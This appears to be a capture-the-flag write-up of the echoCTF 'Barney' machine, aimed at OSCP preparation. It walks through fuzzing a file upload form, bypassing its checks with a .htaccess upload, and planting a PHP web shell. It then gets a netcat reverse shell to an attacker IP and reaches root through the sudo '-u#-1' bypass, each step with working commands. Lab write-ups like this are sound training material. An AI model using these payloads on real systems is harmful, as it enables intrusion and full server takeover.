---
title: "echoCTF Barney Writeup: File Upload to root via sudo foo"
date: 2025-08-15
categories: ["CTF", "OSCP Prep", "echoCTF"]
tags: ["Apache", ".htaccess", "sudo", "privilege escalation"]
description: "Crack Barney on echoCTF with file upload enumeration, bypasses and sudo foo. Perfect for OSCP prep!"
---

# Enumeration 

Start by port scanning the target machine. 
And reading the description of the box that highlight the keyword `beer` and the following:
`Provide a steady supply of beer and you may get something more than a BURRRRRRPPPP!`
## NMAP

```bash
sudo nmap -nvv -p- 10.0.50.0 -T4 -sC -sV
```
## NMAP Output

```bash
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST
```

Found an Apache webserver version 2.4.38 running on port 80.

Since is Apache we know its using PHP by default, also by visiting the page we see that there is an upload functionality with a "message" saying that it does not accept PHP files.

![Image Description](/images/barney-1.png)

Start a directory brute force to search for hidden files

```bash
gobuster dir -u http://10.0.50.0/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt - root-rsw.txt

# Nothing Interesting Found
```

Lets try to upload a `.txt` file to the application.

```bash
cat test.txt
dotpirate
```

![Image Description](/images/barney-3.png)

![Image Description](/images/barney-2.png)
# Exploitation

Trying to upload different file formats such as `.png` `.jpg` `.svg` gives us the same response.
Then tried more file formats using brute force and a wordlist which again gave us back the same response. We can automate this with `ffuf` likewise.

First save the POST request from burp to a file locally
Then edit the file and add the word `FUZZ` in the place you want to brute force.

![Image Description](/images/barney-8.png)

Now we can utilize `ffuf` to do the brute force 

```bash
ffuf -X POST -request upload.txt -request-proto "http" -w /usr/share/wordlists/seclists/Discovery/Web-Content/web-extensions.txt
```

We can also view the request sent by `ffuf` through burp to make sure the attack is done as expected.

To do this we have to add the `-x` flag which allows us to specify a proxy

```bash
ffuf -X POST -request upload.txt -request-proto "http" -w /usr/share/wordlists/seclists/Discovery/Web-Content/web-extensions.txt -x http://127.0.0.1:8080
```

![Image Description](/images/barney-9.png)

However as you can see all of the tries came back with the same error.

> More attacks/techniques on how to `attack file upload functionality` along with my personal methodology can be found [here](/notes/Web/file-uploads/file-uploads)

After multiple attempts and different techniques I went back and read the description.
Then I begun to replace values of the upload requests with the word `beer`.

![Image Description](/images/barney-4.png)

And it worked!

![Image Description](/images/barney-5.png)

So now, I started removing the word `beer` one by one and resend the request in order to understand which value is the one that allows us to bypass that restriction.

It seems that the property `name` within the upload POST request is the one that requires the word beer to proceed with the upload

![Image Description](/images/barney-6.png)

So now that we can finally upload files lets try to upload a malicious PHP web shell!

```bash
cat shell.php

<?php system($_REQUEST['dotpirate']); ?>
```

But he hit another wall with a different error now..
![Image Description](/images/barney-10.png)

Back to fuzzing!

First i tried fuzzing the filename extension using `ffuf` and see if i can get any PHP equivalent files to pass such as `php3, php4` etc. This wordlist can be found [here](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/refs/heads/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)

Modified my POST request.

![Image Description](/images/barney-11.png)

```bash
ffuf -X POST -request upload.txt -request-proto "http" -w ./php-extensions.txt -x http://127.0.0.1:8080
```

It seems that we managed to upload multiple files on the server 

![Image Description](/images/barney-12.png)

However when we try to access and execute our web shell it does not work so now we can guess that there must be a security control behind this website which allows specific PHP versions to be executed.

Something that i have missed however is that whenever we upload a  file successfully the file is saved in the root directory of the webserver "/". This means that we can attempt to upload a `.htaccess` and hopefully replace the one that is on the server allowing our own file extensions to be uploaded!

If you do not know what `.htaccess` is, it is worth give it a 5 min look!

```bash
cat .htaccess

AddType application/x-httpd-php .dotpirate
```

![Image Description](/images/barney-14.png)

It seems that the file uploaded successfully without any error, lets try uploading our web shell again but using out custom extension `shell.dotpirate`. Also make sure to change the content type as the one we specified in out `.htaccess` -> `application/x-httpd-php`

This is how our upload POST request should look like now:

![Image Description](/images/barney-13.png)

```bash
curl 'http://10.0.50.0/shell.dotpirate?dotpirate=id'

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


We finally get our web shell!

Let get a reverse shell, by first checking if `nc` is enabled on the target server. Then we can open a `netcat` listener and then use `nc` to send us a reverse shell!
```bash
sudo nc -nvlp 80                          
[sudo] password for kali: 
listening on [any] 80 ...

curl 'http://10.0.50.0/shell.dotpirate?dotpirate=which%20nc'
/bin/nc 

curl 'http://10.0.50.0/shell.dotpirate?dotpirate=nc%2010.10.11.150%2080%20-e%20/bin/bash'
```

![Image Description](/images/barney-15.png)

# Privilege Escalation

Lets upgrade our shell using python

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'

CTRL + Z

stty raw -echo;fg
(Press Enter)
(Press Enter)
(Press Enter)

export TERM=xterm
```

Manual enumeration i always do before going for automated scripts

```bash
# Check who we are?
id

# What other users exist on the box?
cat /etc/passwd | grep sh$

# Do i have sudo capabilities?
sudo -l

# Are there ant localservices running on the box?
netstat -ano | grep LIST
ss -antp

# Always check the directroy we landed it, in this case is `/var/www/html/images`
ls -la

# Check for wierd files in `/opt` and `/tmp`
ls -la /tmp && ls -la /opt
```

```bash
www-data@barney:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@barney:/var/www/html$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
ETSCTF:x:1000:33:ETSCTF_6c32ae1cc8901e60d12247bb0e2a2830:/home/ETSCTF:/bin/bash

www-data@barney:/var/www/html$ sudo -l
User www-data may run the following commands on barney:
    (ALL, !root) NOPASSWD: ALL

```

By simple google the output of `sudo -l` point me to a reddit [discussion](https://www.reddit.com/r/linux/comments/dhwchx/sudo_flaw_lets_linux_users_run_commands_as_root/) which suggest a bypass!
![Image Description](/images/barney-16.png)

```bash
sudo -u#-1 id -u
```

By trying it we can get reverse shell as root!

```bash
sudo nc -nvlp 80

sudo -u#-1 nc 10.10.11.150 80 -e /bin/bash
```

![Image Description](/images/barney-17.png)

ROOT!